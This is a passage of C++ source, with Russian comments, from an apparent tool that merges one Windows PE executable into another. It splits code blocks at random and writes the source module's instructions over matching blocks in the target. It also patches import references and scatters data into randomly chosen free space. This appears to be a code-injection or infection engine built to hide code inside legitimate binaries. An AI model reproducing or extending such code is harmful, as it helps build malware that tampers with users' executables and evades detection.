			pelib::relocation_table::relocation_list relocs = getRelocsForBlock(pBlock, peModule);

			int getBlockSize = pBlock->getBlockSize();
			size_t instrCount = pBlock->getInstrCount();
			
			if (instrCount > 1) {
				if (relocs.size() > maxAllowedRelocsPerBlock) {
					pCodeInfo->splitBlock(pBlock, getRandomInstrBetweenRelocatableInstrs(peModule, pBlock));
					itr = blocks.begin();
				}
				else if (getBlockSize > maxBlockSize) {
					int rndVal = 1 + Utils::random() % (instrCount - 1);
					pCodeInfo->splitBlock(pBlock, *(pBlock->begin() + rndVal));
					itr = blocks.begin();
				}
				else {
					++itr;
				}
			}
			else {
				++itr;
			}
		}
	}

	bool isInsructionsEqual(DISASM* pInstr1, DISASM* pInstr2)
	{
		if (((pInstr1->Instruction.Opcode == pInstr2->Instruction.Opcode &&
			pInstr1->Instruction.Category == pInstr2->Instruction.Category &&
			pInstr1->Argument1.ArgType == pInstr2->Argument1.ArgType &&
			pInstr1->Argument2.ArgType == pInstr2->Argument2.ArgType &&
			pInstr1->Argument3.ArgType == pInstr2->Argument3.ArgType &&
			pInstr1->Instruction.ImplicitModifiedRegs == pInstr2->Instruction.ImplicitModifiedRegs) ||
			pInstr1->Instruction.BranchType != 0 && pInstr2->Instruction.BranchType != 0) && pInstr1->len == pInstr2->len) {
			return true;
		}

		return false;
	}

	PEDataInfo::DataMap::const_iterator getDataBlockIteratorFor(uint64_t dataPos, const PEDataInfo* pDatas)
	{
		PEDataInfo::DataMap::const_iterator itr;
		for (itr = pDatas->begin(); itr != pDatas->end(); ++itr) {
			if (dataPos >= itr->first && dataPos < (itr->first + itr->second)) {
				break;
			}
		}

		return itr;
	}

	uint64_t getNextPositionForDataInTarget(uint64_t currentPos, uint32_t dataSize, uint32_t align)
	{
		uint64_t newPos;
		PEDataInfo::DataMap::const_iterator itr;
		PEDataInfo* pTargetDatas = _pTargetPE->getDatas();
		if (currentPos == 0) {
			itr = pTargetDatas->begin();
			for (; itr != pTargetDatas->end(); ++itr) {
				newPos = ALIGN_UP_BY(itr->first - 1, align);// pTargetDatas->alignUp(itr->first - 1);
				if (newPos >= itr->first && (newPos + dataSize) < (itr->first + itr->second)) {
					return newPos;
				}
			}
			return 0;
		}

		newPos = ALIGN_UP_BY(currentPos, align);
		itr = getDataBlockIteratorFor(currentPos, pTargetDatas);

		// Проверяем доступность свободного места для перемещаемого блока в текущем блоке целевого модуля.
		if (newPos >= itr->first && (newPos + dataSize) < (itr->first + itr->second)) {
			return newPos;
		}
		else {
			// Выбираем следующий подходящий по размеру блок.
			for (++itr; itr != pTargetDatas->end(); ++itr) {
				if (itr->second >= dataSize) {
					newPos = ALIGN_UP_BY(itr->first - 1, align);
					return newPos;
				}
			}
		}

		return 0;
	}

	uint32_t matchAlign(uint64_t va)
	{
		uint32_t low32 = (uint32_t)va;
		uint32_t align = 2;

		for (; (align & low32) == 0; align <<= 1);
		return align;
	}

	void recursiveScanSpaceForData(PEDataInfo::DataMap::const_iterator dataBlockItr)
	{
		if (dataBlockItr == _pSourcePE->getDatas()->end()) {
			return;
		}

		std::vector<uint64_t> poses;
		uint32_t align = matchAlign(dataBlockItr->first);

		uint32_t dataBlockSize = dataBlockItr->second;
		uint64_t dataBlockPos = getNextPositionForDataInTarget(0, dataBlockSize, align);
		// Формируем дял блока список всевозможных позиций в целевом модулей.
		while (dataBlockPos != 0) {
			poses.push_back(dataBlockPos);
			dataBlockPos = getNextPositionForDataInTarget(dataBlockPos + 1, dataBlockSize, align);
		}

		if (!poses.empty()) {
			do {
				uint32_t rndPos = Utils::random() % poses.size();
				// Резервируем память в целевом блоке.
				dataBlockPos = poses[rndPos];
				_dataPoses.push_back(dataBlockPos);
				_pTargetPE->getDatas()->cutData(dataBlockPos, dataBlockSize);
				// Переходим к следующему блоку.
				recursiveScanSpaceForData(++dataBlockItr);
				--dataBlockItr;

				if (_dataPoses.size() == _pSourcePE->getDatas()->getBlocksCount()) {
					break;
				}

				_dataPoses.pop_back();
				_pTargetPE->getDatas()->recoverData(dataBlockPos, dataBlockSize);
				poses.erase(poses.begin() + rndPos);
			} while (!poses.empty());
		}
	}

	void moveAllDataToTarget()
	{
		int i = 0;
		PEDataInfo* pDatas = _pSourcePE->getDatas();

		// Удаляем блоки, на которые нет ссылок из кода.
		pDatas->removeUnreferencedBlocks();

		recursiveScanSpaceForData(pDatas->begin());
		if (_dataPoses.empty()) {
			throw Poco::RuntimeException("Cannot distribute data");
		}

		// Перемещаем данные и корректируем ссылки на них в соответствующих инструкциях.
		for (PEDataInfo::DataMap::const_iterator itr = pDatas->begin(); itr != pDatas->end(); ++itr, ++i) {
			InstrVector instrs = _pSourcePE->getDatas()->getReferencedInstrs(itr->first);
			if (instrs.empty()) {
				throw Poco::RuntimeException("Not found any instruction referenced to data at 0x" + Poco::NumberFormatter::formatHex(itr->first));
			}
			for (InstrVector::const_iterator instrItr = instrs.begin(); instrItr != instrs.end(); ++instrItr) {
				const DISASM* pInstr = *instrItr;
				*((uint32_t*)(pInstr->EIP + pInstr->len - sizeof(uint32_t))) = (uint32_t)_dataPoses[i];
			}

			uint8_t* srcPtr = pDatas->getDataRawPtr(itr->first);
			if (srcPtr == 0) {
				throw Poco::NotFoundException("Not found any data section containing VA 0x" + Poco::NumberFormatter::formatHex(itr->first));
			}
			uint8_t* destPtr = _pTargetPE->getDatas()->getDataRawPtr(_dataPoses[i]);
			if (destPtr == 0) {
				throw Poco::NotFoundException("Not found any data section containing VA 0x" + Poco::NumberFormatter::formatHex(_dataPoses[i]));
			}
			__movsb(destPtr, srcPtr, itr->second);
		}
	}

	pelib::relocation_table::relocation_list getRelocsForBlock(const BasicBlock* pBlock, const PEModule& peModule)
	{
		pelib::relocation_table::relocation_list usedRelocs;

		if (peModule.hasRelocs()) {
			for (InstrVector::const_iterator itr = pBlock->begin(); itr != pBlock->end(); ++itr) {
				const DISASM* pInstr = *itr;
				if (pInstr->len >= 5) {
					const pelib::relocation_entry* pEntry = peModule.getRelocForInstr(pInstr);
					if (pEntry != 0) {
						usedRelocs.push_back(*pEntry);
					}
				}
			}
		}

		return usedRelocs;
	}

	void prepareСharacteristicVector(const PEModule& peModule, const BasicBlock* pBlock, pelib::relocation_table::relocation_list& relocs, ByteVector& destVector, const bool useRelocs = true)
	{
		uint64_t i;
		for (InstrVector::const_iterator itr = pBlock->begin(); itr != pBlock->end(); ++itr) {
			const DISASM* const pInstr = *itr;

			if (pInstr->len < 5 || !useRelocs) {
				for (i = 0; i < pInstr->len; ++i) {
					destVector.push_back(0);
				}
			}
			else {
				pelib::relocation_table::relocation_list::const_iterator rItr = relocs.begin();
				for (; rItr != relocs.end(); ++rItr) {
					const pelib::relocation_entry& entry = *rItr;
					uint64_t virtualAddr = peModule.getImageBase() + entry.getRVA();

					if (virtualAddr > pInstr->VirtualAddr && virtualAddr < (pInstr->VirtualAddr + pInstr->len)) {
						for (i = pInstr->VirtualAddr; i < virtualAddr; ++i) {
							destVector.push_back(0);
						}

						for (; i < (pInstr->VirtualAddr + pInstr->len); ++i) {
							destVector.push_back(1);
						}
						break;
					}
				}

				if (rItr == relocs.end()) {
					for (i = 0; i < pInstr->len; ++i) {
						destVector.push_back(0);
					}
				}
			}
		}
	}

	bool compareСharacteristicVectors(ByteVector::const_iterator sBegin, ByteVector::const_iterator sEnd, ByteVector::const_iterator tBegin, ByteVector::const_iterator tEnd)
	{
		ByteVector::const_iterator itr1 = sBegin;
		ByteVector::const_iterator itr2 = tBegin;
		for (; itr1 != sEnd; ++itr1, ++itr2) {
			if (*itr1 != *itr2) {
				return false;
			}
		}

		return true;
	}

	bool crossBlocks(BasicBlock* pSourceBlock, BasicBlock* pTargetBlock)
	{
		// Перед гибритизацией блоков необходимо выяснить все возможные варианты гибритизации с учётом релоцируемых участков.
		// Для каждого блока составляется байтовый характеристический вектор, где релоцируемые байты соотвествуют единицам в векторе, остальные нулям.
		// Для поиска всех возможных вариантов берётся меньший по длине вектор (исходного блока) и методом скольжения складывается мо модулю с подвектором целевого вектора.
		// для проверки идентичности исходного вектора и целевого подвектора используется сложение по модулю 2.
		// В этом случае, два ветора считабтся идентичными, если операция XOR по ним возвращает нулевой вектор.
		bool ret = false;
		ByteVector sourceLine, targetLine;
        DwordVector poses;
		prepareСharacteristicVector(*_pTargetPE, pTargetBlock, _targetRelocs, targetLine);
		prepareСharacteristicVector(*_pSourcePE, pSourceBlock, _sourceRelocs, sourceLine, _pTargetPE->hasRelocs());

		int diff = targetLine.size() - sourceLine.size() + 1;
		for (ByteVector::const_iterator targetItr = targetLine.begin(); targetItr != (targetLine.begin() + diff); ++targetItr) {
			if (compareСharacteristicVectors(sourceLine.begin(), sourceLine.end(), targetItr, targetItr + sourceLine.size())) {
                poses.push_back((uint32_t)(targetItr - targetLine.begin()));
			}
		}

		if (!poses.empty()) {
			const DISASM* pFirstTargetDasm = pTargetBlock->getFirstInstruction();
			uint32_t blockOff = poses[Utils::random() % poses.size()];
			uint8_t* pTargetBuffer = (uint8_t*)(pFirstTargetDasm->EIP + blockOff);
			uint64_t targetVA = pFirstTargetDasm->VirtualAddr + blockOff;

			// Перемещаем инструкции исходного блока в память целевого.
			for (InstrVector::iterator itr = pSourceBlock->begin(); itr != pSourceBlock->end(); ++itr) {
				DISASM* pInstr = *itr;
				memcpy(pTargetBuffer, (const uint8_t*)pInstr->EIP, pInstr->len);
				pInstr->EIP = (puint_t)pTargetBuffer;
				pInstr->VirtualAddr = targetVA;
				targetVA += pInstr->len;
				pTargetBuffer += pInstr->len;

				// Проверяем вызывает ли инструкция испортируемую функцию и в случае успеха корректируем адрес импорта.
				const pelib::imported_function* const pImportFunc = _pSourcePE->getRefToImportTable(pInstr);
				if (pImportFunc != 0) {
					uint64_t importVA;
					_pTargetPE->searchImportFunction(pImportFunc->getName(), importVA);
					uint32_t* pDisp = (uint32_t*)(pInstr->EIP + pInstr->len - sizeof(uint32_t));
					*pDisp = (uint32_t)importVA;
				}
			}

			targetVA -= pSourceBlock->getBlockSize();

			// Разбиваем целевой блок, извлекая из него инструкции, которые были затронуты при переносе исходного блока.
			BasicBlock* pAffectedBlock = _pTargetPE->getCodeInfo()->breakBlock(pTargetBlock, targetVA, targetVA + pSourceBlock->getBlockSize());
			
			// Correctness check...
			if (!(pSourceBlock->getFirstInstruction()->VirtualAddr >= (pAffectedBlock->getFirstInstruction()->VirtualAddr) &&
				(pSourceBlock->getLastInstruction()->VirtualAddr + pSourceBlock->getLastInstruction()->len) <= (pAffectedBlock->getLastInstruction()->VirtualAddr + pAffectedBlock->getLastInstruction()->len))) {
				std::cout << "Out of voundaries" << std::endl;
			}

			_pTargetPE->getCodeInfo()->deleteBlock(pAffectedBlock);

			ret = true;
		}

		return ret;
	}

	bool _helpRequested;
	std::string _params;
	int _mode;
    bool _dll;

	PEModule* _pSourcePE;
	PEModule* _pTargetPE;
	std::map<uint64_t, uint64_t> _equals;

	pelib::relocation_table::relocation_list _sourceRelocs;
	pelib::relocation_table::relocation_list _targetRelocs;

	std::vector<uint64_t> _dataPoses;

};

}

POCO_APP_MAIN(amte::Application)
